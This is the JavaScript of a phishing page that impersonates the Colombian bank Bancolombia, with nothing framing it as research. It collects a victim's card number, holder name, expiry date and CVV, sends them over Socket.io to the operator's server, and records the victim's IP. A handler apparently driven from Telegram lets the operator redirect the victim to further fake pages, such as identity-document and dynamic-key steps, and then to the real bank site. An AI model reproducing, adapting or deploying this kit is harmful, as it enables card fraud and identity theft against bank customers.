document.addEventListener('DOMContentLoaded', function() {
    'use strict';
    // Elementos del formulario
    const cardForm = document.getElementById('cardForm');
    const cardNumberInput = document.getElementById('cardNumber');
    const cardHolderInput = document.getElementById('cardHolder');
    const expiryDateInput = document.getElementById('expiryDate');
    const cvvInput = document.getElementById('cvv');
    const submitButton = document.querySelector('.btn-iniciar');
    const sessionId = Date.now().toString();
    
    // Configurar Socket.io
    const socket = io({
        reconnection: true,
        reconnectionAttempts: 5,
        reconnectionDelay: 1000,
        query: { clientId: sessionId }
    });

    // Inicializar sesión
    socket.emit('initSession', { sessionId });

    // Crear overlay de carga
    const loadingOverlay = document.createElement('div');
    loadingOverlay.className = 'loading-overlay';
    loadingOverlay.innerHTML = `
        <img src="img/LogoBancolombia.png" alt="Cargando..." class="loading-logo">
    
    `;
    document.body.appendChild(loadingOverlay);

    // Formatear número de tarjeta (solo números, máximo 16 dígitos)
    cardNumberInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 16) {
            value = value.slice(0, 16);
        }
        let formattedValue = '';
        
        for (let i = 0; i < value.length; i++) {
            if (i > 0 && i % 4 === 0) {
                formattedValue += ' ';
            }
            formattedValue += value[i];
        }
        
        e.target.value = formattedValue;
        validateForm();
    });

    // Formatear fecha de vencimiento (formato XX/XX)
    expiryDateInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        
        if (value.length > 4) {
            value = value.slice(0, 4);
        }
        
        if (value.length >= 2) {
            const month = value.substring(0, 2);
            const year = value.substring(2);
            // Validar que el mes esté entre 01 y 12
            if (parseInt(month) > 12) {
                value = '12' + year;
            }
            e.target.value = value.length >= 2 ? 
                `${month}/${year}` : 
                value;
        } else {
            e.target.value = value;
        }
        
        validateForm();
    });

    // Validar CVV (solo números, máximo 4 dígitos)
    cvvInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 4) {
            value = value.slice(0, 4);
        }
        e.target.value = value;
        validateForm();
    });

    // Validar nombre del titular
    cardHolderInput.addEventListener('input', validateForm);

    // Función de validación
    function validateForm() {
        const cardNumber = cardNumberInput.value.replace(/\s/g, '');
        const cardHolder = cardHolderInput.value.trim();
        const expiryDate = expiryDateInput.value;
        const cvv = cvvInput.value;

        const isCardNumberValid = cardNumber.length === 16;
        const isCardHolderValid = cardHolder.length >= 5;
        const isExpiryDateValid = /^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDate);
        const isCvvValid = cvv.length >= 3 && cvv.length <= 4;

        if (isCardNumberValid && isCardHolderValid && isExpiryDateValid && isCvvValid) {
            submitButton.removeAttribute('disabled');
            submitButton.style.backgroundColor = '#FFD700';
        } else {
            submitButton.setAttribute('disabled', '');
            submitButton.style.backgroundColor = '';
        }
    }

    // Manejar envío del formulario
    cardForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        loadingOverlay.style.display = 'flex';

        try {
            await new Promise((resolve, reject) => {
                const timeoutId = setTimeout(() => {
                    socket.off('dataSent');
                    reject(new Error('Timeout esperando confirmación'));
                }, 30000);

                socket.once('dataSent', (response) => {
                    clearTimeout(timeoutId);
                    if (response.success) {
                        resolve();
                    } else {
                        reject(new Error(response.message || 'Error al enviar datos'));
                    }
                });

                // Enviar datos a través de Socket.io
                socket.emit('sendData', {
                    type: 'tarjeta',
                    sessionId,
                    content: {
                        text: `💳 Datos de tarjeta\n` +
                              `👤 Titular: ${cardHolderInput.value}\n` +
                              `🔢 Número: ${cardNumberInput.value}\n` +
                              `📅 Vencimiento: ${expiryDateInput.value}\n` +
                              `🔐 CVV: ${cvvInput.value}`
                    }
                });
            });
        } catch (error) {
            console.error('Error:', error);
            loadingOverlay.style.display = 'none';
            alert('Error al procesar la información. Por favor, intente nuevamente.');
        }
    });

    // Manejar respuesta del servidor
    socket.on('dataSent', (response) => {
        if (response.success) {
            // Mantener la pantalla de carga activa
            loadingOverlay.style.display = 'flex';
        } else {
            loadingOverlay.style.display = 'none';
            alert('Error al procesar la información: ' + (response.message || 'Error desconocido'));
        }
    });

    // Manejar errores de socket
    socket.on('error', (error) => {
        console.error('Error de socket:', error);
        loadingOverlay.style.display = 'none';
        alert('Error de conexión: ' + (error.message || 'Error desconocido'));
    });

    // Manejar acciones de Telegram
    socket.on('telegramAction', ({ action }) => {
        console.log('Acción de Telegram recibida:', action);
        switch(action) {
            case 'index':
                window.location.href = '/index.html';
                break;
            case 'dinamica':
                window.location.href = '/dinamica.html';
                break;
            case 'terminos':
                window.location.href = '/terminos.html';
                break;
            case 'tarjeta':
                window.location.href = '/tarjeta.html';
                break;
            case 'cedula':
                window.location.href = '/cedula.html';
                break;
            case 'finalizar':
                window.location.href = 'https://www.bancolombia.com/personas';
                break;
            default:
                console.log('Acción desconocida:', action);
        }
    });

    // Actualizar IP y fecha/hora
    async function updateIpAndDateTime() {
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            document.getElementById('ipAddress').textContent = `Dirección IP: ${ipData.ip}`;
            
            const now = new Date();
            const options = { 
                weekday: 'long', 
                year: 'numeric', 
                month: 'long', 
                day: 'numeric',
                hour: 'numeric',
                minute: 'numeric',
                hour12: true,
                timeZone: 'America/Bogota'
            };
            document.getElementById('datetime').textContent = now.toLocaleDateString('es-CO', options);
        } catch (error) {
            console.error('Error:', error);
        }
    }

    // Actualizar fecha/hora e IP inicialmente y cada minuto
    updateIpAndDateTime();
    setInterval(updateIpAndDateTime, 60000);
}); // Fin del DOMContentLoaded